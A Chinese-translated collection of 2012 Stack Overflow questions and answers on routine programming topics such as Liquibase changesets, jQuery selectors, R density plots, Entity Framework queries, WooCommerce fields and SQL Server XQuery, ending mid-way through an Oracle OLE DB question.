我不知道`sql`可以在变更集中使用。[我在这里](http://assarconsulting.blogspot.com/2011/08/database-migration-in-grails.html)的示例中发现了它，我认为这是我需要的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-07T19:22:19.930

正如您已经发现的那样，您可以运行任意 SQL 查询作为变更集的一部分。我在我的[博客文章](http://scalabilitycookbook.com/2012/10/05/control-your-database-schema/)中回顾了常见的警告。

所以对于你的例子：

```
<changeset>
  <createTable tableName="baz_table"/>
  <sql>insert into baz_table(baz) select baz from foobar</sql>
  <dropColumn tableName="foobar_table" columName="baz"/>
</changeset> 
```

# ios - 是否可以使用 Testflight 和 crashreport 和 crashlytics 进行分发

> ID：12624749
> 
> 赞同：5
> 
> 时间：2012-09-27T15:19:30.783
> 
> 标签：ios, testflight

我正在使用 testflight 分发我的应用程序的测试版，有时在登录网站时遇到问题。我想尝试 crashlytics，但我读到同时使用两者存在一些问题。我可以不包括 testflight SDK 并且仍然能够使用它分发测试版吗？这是一种正常的做法还是我应该坚持一个？两者都使用 hockeyapp 怎么样？

同样对于使用 crashlytics 的人，您是否首先要求用户允许发送崩溃报告。

PS如果这个问题不适合stackoverflow，请让我知道stackexchange在哪里

先感谢您！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-27T15:33:17.143

来自 Crashlytics 的 Wayne。Crashlytics 是兼容的，您不必担心。如需支持，您可以通过 support.crashlytics.com 联系。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-27T15:21:29.043

您不需要使用 testflight SDK 与 testflight 一起分发，因此删除它并使用 ccrashlytics。

你可以在他们成为beta用户之前问他们，你不需要每次都问。如果您将该代码投入生产，那么您应该在每次发送前询问。

# python - 使用设置差异来获取缺失值的行号

> ID：12624756
> 
> 赞同：0
> 
> 时间：2012-09-27T15:19:38.893
> 
> 标签：python, list, set, compare, difflib

我有两个列表，我使用以下函数来分配行号（类似于 unix 中的 nl）：

```
def nl(inFile):
    numberedLines = []
    for line in fileinput.input(inFile):
        numberedLines.append(str(fileinput.lineno()) + ':  ' + line)
    numberWidth = int(log10(fileinput.lineno())) + 1
    for i, line in enumerate(numberedLines):
        num, rest = line.split(':',1)
        fnum = str(num).rjust(numberWidth)
        numberedLines[i] = ':'.join([fnum, rest])
    return ''.join(numberedLines) 
```

这将返回列表，如：`1: 12 14` `2: 20 49` `3: 21 28`。对于`infile`我正在使用的，行号非常重要。我的第二个列表的结构相同，但行号没有任何意义。我需要从第二个文件中找到列表差异并从第一个文件中返回行号。例如：如果第二个文件有：`5: 12 14` `48: 20 49`我只想返回`3`第一个列表中缺失值的行号。

这是我尝试过的：

```
oldtxt = 'master_list.txt'  # Line numbers are significant
newFile = 'list2compare.txt' # Line numbers don't matter

s = set(nl(oldtxt))
diff = [x for x in (newFile) if x not in s]
print diff 
```

返回：`[12 14\n', '20 49\n', '21 28\n']`-- 显然不是我需要的。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:58:24.797

以下情况如何：

```
f1 = """\
12 14
20 49
21 28
"""

f2 = """\
12 14
20 49
"""

def parse(lines):
  "Take a list of lines, turn into a dict of line number => value pairs"
  return dict((i + 1, v) for i, v in enumerate(l for l in lines if l))

def diff(a, b):
  """
  Given two dicts from parse(), remove go through each linenno => value in a and
  if the value is in b's values, discard it; finally, return the remaining
  lineno => value pairs
  """
  bvals = frozenset(b.values())
  return dict((ak, av) for ak, av in a.items() if av not in bvals)

def fmt(d):
  "Turn linno => value pairs into '  lineno: value' strings"
  nw = len(str(max(d.keys())))
  return ["{0:>{1}}: {2}".format(k, nw, v) for k, v in d.items()]

d1 = parse(f1.splitlines())
print d1
print
d2 = parse(f2.splitlines())
print d2
print
d = diff(d1, d2)
print d
print
print "\n".join(fmt(d)) 
```

这给了我输出：

```
{1: '12 14', 2: '20 49', 3: '21 28'}

{1: '12 14', 2: '20 49'}

{3: '21 28'}

3: 21 28 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T16:13:59.420

您可以将[difflib](http://docs.python.org/library/difflib.html)用于 ttis：

```
>>> f1 = """1 2 3 4
... test
... 6 7 8 9
... compare
... me
... """
>>> 
>>> f2 = """6 7 8 9
... 10 11 12 13
... me
... """
>>>
>>> import difflib
>>> for line in difflib.ndiff(f1.splitlines(), f2.splitlines()):
...    if line.startswith('-'):
...       print "Second file is missing line: '%s'" % line
...    if line.startswith('+'):
...       print "Second file contains additional line: '%s'" % line
... 
Second file is missing line: '- 1 2 3 4'
Second file is missing line: '- test'
Second file is missing line: '- compare'
Second file contains additional line: '+ 10 11 12 13' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T16:04:44.320

我会对此进行尝试；）听起来您在主文件的行号之后，该行的内容也在比较文件中。这就是你所追求的吗？在这种情况下，我建议...

主文件内容...

```
1 2 3 4
test
6 7 8 9
compare
me 
```

比较文件内容...

```
6 7 8 9
10 11 12 13
me 
```

代码：

```
master_file = open('file path').read()
compare_file = open('file path').read()

lines_master = master_file.splitlines()
lines_compare = compare_file.splitlines()
same_lines = []
for i,line in enumerate(lines_master):
    if line in lines_compare:
        same_lines.append(i+1)

print same_lines 
```

结果是 [3,5]

# jquery - jQuery 通过两个名称根选择并根据选择的根执行两个功能之一

> ID：12624761
> 
> 赞同：0
> 
> 时间：2012-09-27T15:19:48.727
> 
> 标签：jquery

我试图让这段代码在 jQuery 中工作，并且我试图确保对于每个根元素的每次迭代，其用于同一迭代的备用根元素不包含任何内容。否则，它将 .val("") 属性设置为空字符串。如果可能，使用搜索、查找或交换来寻找简单的解决方案。

每个匹配的数字都在相同的行级别和相同的迭代计数上。

我有两种输入类型的输入文本元素，它们具有两个不同的根名称，如下所示：

第一个根是“ **rootA** ”

```

    <input type="text" name="rootA1" />
    <input type="text" name="rootA2 />
    <input type="text" name="rootA3" />

```

第二个根是“ **rootB** ”

```

    <input type="text" name="rootB1" />
    <input type="text" name="rootB2 />
    <input type="text" name="rootB3" />

```

如果调用函数 fnRootA(); 调用任何 rootA，则在模糊时。如果调用函数 fnRootB(); 调用任何 rootB，则在模糊时。

同样，我试图确保对于像 1 这样的每次迭代，备用根不包含任何内容，否则它将 .val("") 属性设置为被模糊的根的空字符串。

我当前的代码适用于单个元素，但想使用 find 或 search 但不知道如何构造它。

```
$("input[name='rootA1']").blur(function(e) {
   fnRootA(1); // 这段代码只是删除了 rootA1 的值 val("")
              //如果rootB1里面有东西value属性
             // 括号中的 (1) 是迭代次数
});

```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:22:46.363

尝试这个

**^**选择器选择所有以 name = root 开头的元素

```
$('input[name^=root]').on('blur', function(){

    if($(this).attr('name').indexOf('rootA') > -1){

       fnRootA();
    }
    else{
        fnRootB();
    }

})​;​ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T15:28:55.537

如果您将一个类添加到您的输入中，例如`class = 'rootA'`前三个和`class='rootB'`其他三个，您可以这样做

编辑：按照@pimvdb 的建议使用hasClass

```
$('input').on('blur', function(){
   if($(this).hasClass('rootA'))
    alert('rootA')
   else if($(this).hasClass('rootB'))
        alert('rootB') 
```

})

见现场[小提琴](http://jsfiddle.net/rceLE/1/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-27T15:24:23.757

您可以使用 jQuery 的[属性 contains selector](http://api.jquery.com/attribute-contains-selector/)。它选择所有`rootA`/`rootB`输入。

像这样：

```
$("input[name*='rootA']").blur(function(e) {
    //execute rootA function
});

$("input[name*='rootB']").blur(function(e) {
    //execute rootB function
}); 
```

（要获得输入的编号，您可以使用 string.replace 来消除根前缀）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-27T15:25:50.557

[**jsFiddle DEMO**](http://jsfiddle.net/FKMd6/)

It looks to me like we are trying to find matching rootB# inputs, easiest way is to just grab the current name of the rootA we're grabbing and get the # following, then call the function with that number and delete the corresponding rootB# value.

```
$('input[name^="rootA"]').blur(function(e) {
    var _name = $(this).attr('name');

    _name = _name.substr(5);
    fnRootA(_name); 

});

function fnRootA(num) {
    console.log(num);

    $('input[name="rootB' + num + '"]').val('');
}
​ 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-27T15:27:46.743

> **UPDATE**

Hmmm. A little broad in your explanation, but I'll take a stab at it.

> *The following will grab all inputs of "rootA" and tell them "hey, on blur make all "rootB" elements go string.empty!"*

```
$("input")
    .filter(function(e) {
        //  This should basically get a jQuery object made up of all input elements whose tag name contains "rootA"
        return $(this).attr("name").indexOf("rootA") != -1;
    })
    .blur(function(e) { //  of course the onblur function
        $("input")
            .filter(function(e) {
                //  This should basically get a jQuery object made up of all input elements whose tag name contains "rootB"
                return $(this).attr("name").indexOf("rootB") != -1;
            })
            .val("");   //  this would set their values to ""
    }) 
```

> *Could also be written*

```
$("input[name*='rootA']")
    .blur(function(e) {    //    of course the onblur function
        $("input[name*='rootB']")
            .val("");    //    this would set their values to ""
    }) 
```

> ***HOWEVER*** If you wanted to change ALL inputs not on the same ROOT as the inputs currently selected you could use the following

```
$("input")
    .blur(function(e) {    //    of course the onblur function
        // Grab the root name without Number for purpose of knowing what inputs NOT to reset
        var rootName = $(this).attr("name").substring(0, 5);
        $("input")
            .filter(function(e) {
                //    This should basically get a jQuery object made up of all input elements whose tag name contains "rootB"
                return $(this).attr("name").indexOf(rootName) == -1;
            })
            .val("");    //    this would set ALL inputs not of current root name values to ""
    }) 
```

# [FULL WORKING EXAMPLE WITH RESET BUTTON HERE](http://jsfiddle.net/SpYk3/Qk7xP/)

# r - 缩放/加权密度图

> ID：12624771
> 
> 赞同：10
> 
> 时间：2012-09-27T15:20:32.000
> 
> 标签：r, frequency-distribution

我想生成一个观察温度的密度图，该密度图按每个温度数据点观察到的事件数量进行缩放。我的数据包含两列：温度和[观察次数]。

现在，我有一个密度图，它只包含温度频率，根据：

```
plot(density(Temperature, na.rm=T), type="l", bty="n") 
```

如何缩放此密度以说明每个温度下的观察次数？例如，我希望能够看到按比例缩放的温度密度图，以显示在较高/较低温度下每个温度是否有更多/更少的观测值。

我想我正在寻找可以衡量温度的东西？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-27T16:30:45.960

我认为您可以通过将`weights`参数传递给`density`. 这是一个使用示例`ggplot`

```
dat <- data.frame(Temperature = sort(runif(10)), Number = 1:10)
ggplot(dat, aes(Temperature)) + geom_density(aes(weights=Number/sum(Number))) 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-09-27T16:50:10.327

并在基础中执行此操作（使用 DanM 的数据）：

```
plot(density(dat$Temperature,weights=dat$Number/sum(dat$Number),na.rm=T),type='l',bty='n') 
```

# jquery - jQuery 移动弹出窗口在新窗口中打开

> ID：12624780
> 
> 赞同：0
> 
> 时间：2012-09-27T15:21:16.567
> 
> 标签：jquery, jquery-mobile, popup

我正在尝试在我的移动应用程序中弹出一个窗口。我的代码是这样的：

```
<a id="options" data-role="button" data-icon="gear" data-iconpos="notext" href="#optionsPopup" data-rel="popup" data-inline="true"></a>

<div data-role="popup" id="optionsPopup" data-overlay-theme="a" style="padding-top: 40px">
    <ul data-role="listview" data-inset="true" style="data-theme:a">
        <li><a href="#" id="go">Go to</a>
            <input name="goInput" type="hidden" data-role="datebox" id="goInput" data-options='{"mode": "calbox"}' />
        </li>
        <li>
            <a href="#" id="compare">Compare</a>
            <input name="compareInput" type="hidden" data-role="datebox" id="compareInput" data-options='{"mode": "calbox"}' />
        </li>
        <li><a onclick="goToday()" >Today</a></li>
    </ul>
</div> 
```

当我单击#options 时，弹出窗口会打开，但不是在弹出窗口中，而是在新窗口中！

有谁知道为什么会这样？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:45:26.920

您是否可能是要使用`data-rel="dialog"`而不是`data-rel="popup"`？

[**如果是这样，您可以在此处**](http://jquerymobile.com/demos/1.1.1/docs/pages/page-dialogs.html)查看有关对话框文档的更多信息。

从评论中更新小提琴会让你得到[**这个**](http://jsfiddle.net/XJDGe/1/)。

# .net - 在 EF POCO 实体相关集合上强制 linq-to-entities（行为类似于 EntityCollection<>）

> ID：12624781
> 
> 赞同：2
> 
> 时间：2012-09-27T15:21:21.353
> 
> 标签：.net, linq-to-entities, entity-framework-5

总结：我有哪些选项可以让实体的子集合的 LINQ 查询使用“LINQ-to-Entities”而不是“LINQ-to-Objects”，换句话说，导致使用生成的查询提供程序SQL而不是执行正常的枚举？这是使用 EF5、DbContext 和 POCO 实体。

另一种看待它的方式是：如何在不更改所有 LINQ 查询的情况下让实体的子集合（ICollection<> 类型）像旧式 EF1 实体的 EntityCollection<> 属性一样工作？

这是我的情况：

我有一个 Entity Framework 5 项目，我正在切换到使用 DbContext 和 POCO 实体而不是 ObjectContext 和默认生成的实体。

在我的代码中，我的查询看起来像这样：

```
var thirdEntities = from secondEntity in firstEntity.SecondEntities
    select secondEntity.ThirdEntity; 
```

这过去只导致单个数据库命中，因为 firstEntity.SecondEntities 是 EntityCollection 类型。这导致使用 LINQ to Entities，它将整个 LINQ 语句转换为 SQL。

但是，当我切换到使用 DbContext 和 POCO 时，上面的语句现在会导致大量数据库命中。这是导致问题的 POCO 类属性：

```
public class FirstEntity {
  public FirstEntity() {
    this.SecondEntities = new HashSet<SecondEntity>();
  }

  public virtual ICollection<SecondEntity> SecondEntities {get; set;}
} 
```

这是因为 firstEntity.SecondEntities 现在是 ICollection 类型（HashSet 的实际类型）。由于延迟加载已打开，因此会命中数据库以填充 firstEntity.SecondEntity，然后将该结果枚举 X 次以填充 secondEntity.ThirdEntity 的每个实例。

我找到的一个解决方案是将第一个查询更改为：

```
var thirdEntities = from secondEntity in dbContext
    .Entry(firstEntity)
    .Collection(e => e.SecondEntities)
    .Query()
    select secondEntity.ThirdEntity; 
```

但是，我不想这样做。我宁愿以某种方式更改 POCO，这样我就不必更改所有 LINQ 查询。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T13:36:35.927

根据我的理解和测试，我运行的 LINQ 查询`EntityCollection<T>`是 LINQ-to-Entities 是不正确的。事实上，它是 LINQ-to-Objects 并且仅在内存中运行，无需创建 SQL 和接触数据库（除了 EF >= 4.0 中的延迟加载）。

举个例子：

```
using (var ctx = new MyEntities())
{
    var firstEntity = ctx.FirstEntities.First(f => f.ID == 1);
    var thirdEntities = (from secondEntity in firstEntity.SecondEntities
                         select secondEntity.ThirdEntity).ToList();
} 
```

这里的第一个查询当然是 LINQ-to-Entities 并`firstEntity`从数据库加载。第二个查询不会创建一个单独的 SQL 查询，`ThirdEntity`正如我使用 SQL 探查器检查过的那样。在 EF 1 中，第二个查询实际上什么都不做，因为`firstEntity.SecondEntities`在第一个查询中没有急切地加载（所以集合是空的）并且 EF 1 不支持延迟加载。在 EF 4 中，将触发延迟加载查询以加载完整集合，然后为要加载的集合中的每个（唯一）元素添加一个额外的延迟加载查询`ThirdEntity`（我也对此进行了测试） - 与您观察到的行为完全相同使用 POCO。

结果对我来说并不奇怪，因为`EntityCollection<T>`没有实现`IQueryable<T>`. 签名是：

```
public sealed class EntityCollection<TEntity> : RelatedEnd, ICollection<TEntity>,
    IEnumerable<TEntity>, IEnumerable, IListSource 
```

您对此类集合执行的所有 LINQ 查询都将使用扩展方法，`IEnumerable<T>`这意味着：它是 LINQ-to-Objects。

但是，与上一个代码片段类似，您可以通过应用以下代码来启用 LINQ-to-Entities/显式`CreateSourceQuery`加载`EntityCollection<T>`：

```
var thirdEntities =
    (from secondEntity in firstEntity.SecondEntities.CreateSourceQuery()
     select secondEntity.ThirdEntity).ToList(); 
```

`CreateSourceQuery`将返回一个`ObjectQuery<T>`表示从数据库加载完整导航集合所需的 SQL。这个查询确实可以被细化以执行更多的过滤或选择，它将作为数据库中的 LINQ-to-Entities 执行。

如果您确定您已经观察到`EntityCollection<T>`与 POCO 不同的查询行为，那么如果您可以提供一个简单的示例模型来重现这一点，将会有所帮助。目前我不知道这怎么会发生。

# woocommerce - 如何在 WooCommerce 中将选择自定义字段添加到结帐页面？

> ID：12624787
> 
> 赞同：6
> 
> 时间：2012-09-27T15:21:40.367
> 
> 标签：woocommerce

我在 WooCommerce 的结帐页面中添加了额外的字段，我已经添加了基本的文本字段，但是我想要一个带有一些选项的下拉菜单或选择框，这是我到目前为止所做的，但我已经做了一个某处出错

```
$fields['billing']['billing_meat'] = array(
    'label'     => __('Food options', 'woocommerce'),
'placeholder'   => _x('', 'placeholder', 'woocommerce'),
'required'  => false,
'clear'     => false
'type'  => 'select',

'options' => array(                     // array of key => value pairs for select options
            __('I eat meat', 'woocommerce') => __('I eat mate', 'woocommerce'),
            __('meat is gross', 'woocommerce') => __('meat is gross', 'woocommerce'), 
```

也许我没有正确定义“类型”字段？

感谢负载

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-01T05:14:34.717

如果那是您的确切代码，那么问题是您在`'clear' => false`.

我已经对此进行了测试，并且可以正常工作：

```
$fields['billing']['billing_meat'] = array(
    'label'       => __('Food options', 'woocommerce'),
    'placeholder' => _x('', 'placeholder', 'woocommerce'),
    'required'    => false,
    'clear'       => false,
    'type'        => 'select',
    'options'     => array(
        'eat-meat' => __('I eat maet', 'woocommerce' ),
        'not-meat' => __('Meat is gross', 'woocommerce' )
        )
    ); 
```

请注意，我也没有`__()`在选项数组键上使用。最好不要翻译这些。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2014-12-09T01:41:35.507

这是有效的。这是我的代码

```
// Hook in
add_filter( 'woocommerce_checkout_fields' , 'dropdown' );

// Our hooked in function - $fields is passed via the filter!
function dropdown( $fields ) {
     $fields['billing']['dropdown'] = array(
        'label'     => __('dropdown', 'woocommerce'),
    'placeholder'   => _x('dropdown', 'placeholder', 'woocommerce'),
    'required'  => false,
    'class'     => array('form-row-wide'),
    'clear'     => true,
    'type'      => 'select',
     'options'     => array(
        'option 1' => __('option 1', 'woocommerce' ),
        'option 2' => __('option 2', 'woocommerce' )
        )//end of options
     );

     return $fields;
} 
```

这行得通。但似乎该值没有保存在_billing_dropdown 下。我使用“管理列”插件在订单表（管理端）中添加一个字段。在我的自定义字段“下拉列表”下，没有显示任何值。我在哪里可以检索值？我的另一个自定义字段“目的”也是如此，它位于“_billing_ purpose”下并且是 type=>'textarea'。谢谢！

这是截图 [https://scontent-b-hkg.xx.fbcdn.net/hphotos-xpf1/v/t1.0-9/10696182_985415141473105_5302358697439449940_n.jpg?oh=74cb5ebc6b1ad6dd0c29e51293b61fdf&oe=55C](https://scontent-b-hkg.xx.fbcdn.net/hphotos-xpf1/v/t1.0-9/10696182_985415141473105_5302358697439449940_n.jpg?oh=74cb5ebc6b1ad6dd0c29e51293b61fdf&oe=5502613C)

# r - 如何在 Mac 上将制表符分隔的文本文件读入 R？

> ID：12624793
> 
> 赞同：0
> 
> 时间：2012-09-27T15:21:49.453
> 
> 标签：r, macos, matrix, input

我有一个制表符分隔的文本文件，我通过将 Excel 工作表中的表格粘贴到文本文件中生成该文件，并且我正在尝试将数据读入Mac 上的**R中。**我得到以下输出

```
system.file("path/to/file.txt")
[1]""
no lines available in input 
```

如果我尝试使用“源脚本或在 R 中加载数据”按钮加载文本文件，我会得到：

```
1:          col1    col2
                    ^
/path/to/file: unexpected symbol 
```

我以为这可能是标签，但后来我添加了

```
sep='\t' 
```

到我的 read.table 行，这仍然不起作用 - 有什么建议吗？

数据采用矩阵格式，行名的第一列/第一行条目没有条目，即第一列

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:47:04.047

我发现试图弄清楚这条路径的最简单方法是搞砸：`getwd()`和`setwd()`. 首先，输入

```
getwd() 
```

在您的 R 终端中。这将提供您的*工作*目录。它还让您了解如何指定文件的路径！该函数`setwd`设置工作目录。

现在您有了正确格式的正确路径，您只需要使用：

```
##For csv files
read.csv(....)
##For tab delimited files
read.delim(....)
##For other files - you can specify `sep` to `\t` if you wish.
read.table(....) 
```

# coderush - CodeRush 命名约定

> ID：12624794
> 
> 赞同：0
> 
> 时间：2012-09-27T15:21:56.743
> 
> 标签：coderush

我正在评估 CodeRush，我缺少的是名称约定检查。我以前使用过 ReSharper，它会自动检查类、属性、方法等的名称。例如，第一个大写字母的属性名称。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:32:19.030

默认 CodeRush 设置可通过

**DevExpress\选项 (Ctrl+Shift+Alt+O)**

然后

**编辑器\代码样式\标识符**

在此页面中，您可以配置**Fields、Locals 和 Parameters**。

CodeRush 还支持丰富的插件生态系统。

在您的情况下，您可能会对这个[StyleNinja 插件感兴趣](http://code.google.com/p/dxcorecommunityplugins/wiki/CR_StyleNinja)

# sql - 从 XPath 中的当前元素中查找过滤属性的相关 XML 元素

> ID：12624798
> 
> 赞同：1
> 
> 时间：2012-09-27T15:22:07.347
> 
> 标签：sql, sql-server, xml, xpath, xquery

如何最好地修改以下语句，以便我收到带有 Address.Location 的 Contact.Name 列表（如果可能，我想使用 XPath 而不是子查询/WHERE 条件）？我在@@@Name 尝试了各种语法，但没有运气:( - 我想在那里引用原始节点。

```
DECLARE @data AS XML
SELECT @data = '
    <Data>
        <Contact Name="John"/>
        <Contact Name="Bob"/>
        <Address ContactName="John" Location="JohnStreet1"/>
        <Address ContactName="John" Location="JohnStreet2"/>
        <Address ContactName="Bob" Location="BobStreet1"/>
    </Data> 
'

SELECT 
    x.v.value('@Name','VARCHAR(255)') [Contact.Name],   
    y.v.value('@Location','VARCHAR(255)') [Address.Location]
FROM 
    @data.nodes('/Data[1]/Contact') AS x(v)
CROSS APPLY
    x.v.nodes('/Data[1]/Address[@ContactName=@@@Name]') AS y(v)
ORDER BY
    x.v.value('@Name','VARCHAR(255)') 
```

PS。这不起作用，因为参数需要是文字:(

```
x.v.nodes('/Data[1]/Address[@ContactName=' + x.v.value('@Name','VARCHAR(255)') + ']') AS y(v) 
```

请注意：目前我正在执行以下操作以获得所需的结果集（但不是以*干净的 XPath 方式*）：

```
SELECT 
    x.v.value('@Name','VARCHAR(255)') [Contact.Name],   
    y.v.value('@Location','VARCHAR(255)') [Address.Location]
FROM 
    @data.nodes('/Data[1]/Contact') AS x(v)
CROSS APPLY
    x.v.nodes('/Data[1]/Address') AS y(v)
WHERE
    y.v.value('@ContactName','VARCHAR(255)')=x.v.value('@Name','VARCHAR(255)')
ORDER BY
    x.v.value('@Name','VARCHAR(255)') 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-03T13:04:59.667

**这是一个纯 XQuery（也恰好是一个纯 XPath 2.0 表达式）：**

```
 for $c in /*/Contact/@Name
    return
      for $loc in /*/Address[@ContactName eq $c]/@Location
           return
              data(($c, $loc, '&#xA;')) 
```

**当针对提供的 XML 文档评估此 XPath 表达式时：**

```
<Data>
    <Contact Name="John"/>
    <Contact Name="Bob"/>
    <Address ContactName="John" Location="JohnStreet1"/>
    <Address ContactName="John" Location="JohnStreet2"/>
    <Address ContactName="Bob" Location="BobStreet1"/>
</Data> 
```

**产生了想要的正确结果**：

```
John JohnStreet1
 John JohnStreet2 
 Bob BobStreet1 
```

**请注意**：

这是一个纯 XQuery / XPath 2.0 解决方案。我不知道 SQL Server XQuery 方言，希望您能够将此解决方案应用于您的案例。

大概是这样的：

```
select @data.query(
      'for $c in /*/Contact/@Name
        return
          for $loc in /*/Address[@ContactName eq $c]/@Location
               return
                  data(($c, $loc, "&#xA;"))'
                   ) 
```

**更新**：

正如 Mikael Eriksson 在评论中指出的，SQL Server XQuery 不接受“异构序列”并引发错误。

**然后这个，稍微修改的查询工作**：

```
select @data.query(
      'for $c in /*/Contact/@Name
        return
          for $loc in /*/Address[@ContactName eq $c]/@Location
               return
                  (string($c), string($loc), "&#xA;")' 
```

**并产生上述想要的正确结果**。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:25:23.543

这能满足你的要求吗？

```
;with cte as
(
    SELECT  
        x.v.value('@Name','VARCHAR(255)') ContactName,
        @data xmlData
    FROM  
        @data.nodes('/Data[1]/Contact') AS x(v)
)
select 
    ContactName as [Contact.Name], 
    y.v.value('@Location','VARCHAR(255)') as [Address.Location] 
from
    cte
        cross apply
    xmlData.nodes('/Data[1]/Address[@ContactName=sql:column("ContactName")]') AS y(v) 
order by 
    ContactName 
```

# javascript - 必应搜索 API 似乎忽略了 $top 值

> ID：12624809
> 
> 赞同：2
> 
> 时间：2012-09-27T15:22:45.067
> 
> 标签：javascript, jquery, json, azure, bing-api

我正在使用 Bing Search API (Azure) 使用 javascript/json 检索新闻头条列表。它正在工作，但由于某种原因忽略了 $top (count) 值，并给我默认/最大 (15) 个结果，无论我放什么。

电话是：

```
https://api.datamarket.azure.com/Data.ashx/Bing/Search/Composite?$format=JSON&Query=%27MyQuery%27&Sources=%27news%27&Market=%27en-US%27&Adult=%27Off%27&$top=5&$skip=0 
```

我可以使用我页面上的代码来限制它，但这对我来说似乎很浪费。我怀疑我错过了一些明显的东西..

感谢您的帮助。

注意：我使用的 $.ajax 中的实际代码行是一个代理 php 脚本：

```
url: "scripts/bingapi.php?query=" + escape("https://api.datamarket.azure.com/Data.ashx/Bing/Search/Composite?$format=JSON&Query=%27MyQuery%27&Sources=%27news%27&Market=%27en-US%27&Adult=%27Off%27&$top=10&$skip=0"), 
```

会不会和“逃跑”有关？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:40:27.933

您遇到的问题是由于 JavaScript 的[转义](http://www.w3schools.com/jsref/jsref_escape.asp)未处理美元符号`$`字符。我建议像这样使用[encodeURIComponent](http://www.w3schools.com/jsref/jsref_encodeuricomponent.asp)：

```
url: "scripts/bingapi.php?query=" + encodeURIComponent("https://api.datamarket.azure.com/Data.ashx/Bing/Search/Composite?$format=JSON&Query=%27MyQuery%27&Sources=%27news%27&Market=%27en-US%27&Adult=%27Off%27&$top=10&$skip=0"), 
```

我希望这有帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-31T10:12:30.540

来自 Bing Composite 服务操作文档：

> 另请注意，使用 OData 保留参数 $top 返回的结果数是指查询中指定的所有数据源，但新闻除外。当您在复合查询中使用新闻时，它将始终返回固定数量的 15 个新闻结果。

取自：[必应搜索 API 的架构表格文档](http://www.bing.com/webmaster/content/developers/ADM_SCHEMA_GUIDE.docx)

# facebook - 有没有办法让脸皮向喜欢我页面的人展示

> ID：12624811
> 
> 赞同：7
> 
> 时间：2012-09-27T15:22:49.870
> 
> 标签：facebook

似乎这个问题已经被打死了，但我看到了不同的（冲突的）答案。

[https://developers.facebook.com/docs/reference/plugins/facepile/](https://developers.facebook.com/docs/reference/plugins/facepile/)上的开发者页面 说，“要显示喜欢你页面的用户，请将页面的 URL 指定为 href 参数。”

这是有道理的，但后来在同一页上说......

“为什么什么都没有显示？

该插件仅显示朋友的照片。如果用户没有喜欢您的页面或连接到您的网站的朋友，则不会显示任何面孔。

（（（（我有几个朋友“喜欢”该网站，但他们的照片没有显示。）））

如果您正在显示喜欢您的页面的用户，并且还没有用户喜欢它，则该插件将不会呈现任何内容。

（（（这里不是这种情况。）））

如果一些用户喜欢你的页面，但没有一个查看用户的朋友喜欢它，插件将显示喜欢你页面的用户总数。

（（（这就是我得到的，“## 人们喜欢这个”所以，如果我理解这一点，有人会来到网站并喜欢它，他们的照片不会出现在我的脸上。他们必须得到他们的朋友喜欢我的页面以获得一张图片以显示在脸上 - 不确定是“喜欢”我的页面的原始人，还是后来“喜欢”它的他的朋友。）））

这一切对我来说听起来有点愚蠢。

我想要的是，当有人“喜欢”我的页面时，他们会在我的头像中显示为“喜欢”我的页面的人。

我读过的一些帖子似乎说它是这样工作的，但我没能做到。

任何帮助/建议。

哦，如果你想看看我在做什么/在做什么，它在：[http ://www.theantinmarketinggroup.com/home](http://www.theantinmarketinggroup.com/home)

真诚感谢您的任何回答。

热情地，B

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-04T01:42:09.793

在找到类似的插件之前，我遇到了类似的问题：[Facebook Like Box](http://developers.facebook.com/docs/reference/plugins/like-box/)。这个*确实*显示了所有“喜欢”页面的人，公开的，*即使完全退出 Facebook*！

我知道必须有办法，因为我看到其他网站这样做了。希望能帮助到你。

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2012-09-27T15:34:32.663

> 我想要的是，当有人“喜欢”我的页面时，他们会在我的头像中显示为“喜欢”我的页面的人。

没有观众与他们成为朋友？

不——因为一个叫做*隐私*的原因。

# c# - OLE DB ORA-01008: 并非所有变量都绑定（但它们是）

> ID：12624814
> 
> 赞同：1
> 
> 时间：2012-09-27T15:23:09.610
> 
> 标签：c#, oledb

我正在尝试与运行非常旧版本的 Oracle (8) 的应用程序交谈。我需要先进行查询以获取最新的 id，然后使用此 id 插入。不幸的是，我在执行时遇到错误。我在网上搜索过，但找不到使用这种查询的人，所以任何帮助指针都将不胜感激。

```
private static OleDbConnection GetConn()
{
return new OleDbConnection()
{
    ConnectionString = ConfigurationManager.ConnectionStrings["conn"].ConnectionString
    };
}

public bool AddModel(Model model)
{
    OleDbConnection conn = GetConn();
    conn.Open();
    StringBuilder sb = new StringBuilder();
    sb.Append("DECLARE max_id INTEGER; ");
    sb.Append("BEGIN ");
    sb.Append("SELECT MAX(SORTID) into max_id FROM QRY.TABLE where status = 'A'; ");
    sb.Append("max_id := max_id + 1; ");
    sb.Append("INSERT INTO QRY.TABLE (COL1,COL2,COL3,COL4,COL5,COL6,COL7,SORTID) VALUES(? ,? ,? ,? ,? ,? ,? ,max_id);");
    sb.Append("END;");
    using (OleDbCommand command = new OleDbCommand(sb.ToString(), conn))
{
        command.Parameters.AddWithValue("COL1", model.ID);
    command.Parameters.AddWithValue("COL2", model.Description);
